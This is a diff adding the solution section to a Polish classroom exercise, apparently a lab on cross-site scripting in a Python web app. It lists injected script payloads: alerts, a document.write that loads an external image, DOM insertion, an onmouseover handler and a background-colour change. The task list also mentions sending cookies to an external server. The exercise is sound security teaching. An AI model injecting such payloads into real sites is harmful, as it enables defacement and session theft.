@@ -20,3 +20,29 @@ Jedną z metod pozwalających na korzystanie z języka Python do tworzenia aplik
  6. wyświetlenie reklamy (obrazka zewnętrznego),  
  7. przesłanie cookie na zewnętrzny serwer,  
  8. zaproponuj poprawioną wersję skryptu.  
+
+
+## Rozwiązanie: 
+`<script>alert("ok")</script>`  
+
+`<script>function a() { document.write("<img src='https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcQoDk2UuUIsnoLap528Ty9OW9T5NQCI4xXJXlfLSLW1hsvx90vGMA'></img><h1>Hello</h1>"); }; window.onload = a; alert("Alert.");</script>`  
+
+`<script> var h = document.createElement("H1"); var t = document.createTextNode("Hello"); h.appendChild(t); document.body.appendChild(h); </script>`  
+
+`<script>
+var img = document.createElement("img");
+img.src = "https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcQoDk2UuUIsnoLap528Ty9OW9T5NQCI4xXJXlfLSLW1hsvx90vGMA";
+document.body.appendChild(img);
+</script>`  
+
+`<a onmouseover="alert(1)" href="#">read this!</a>`
+
+`<script>
+
+function kolor(kolor)
+{
+document.bgColor=kolor;
+}; window.onload = kolor; alert("Alert.");</script>`  
+
+
+
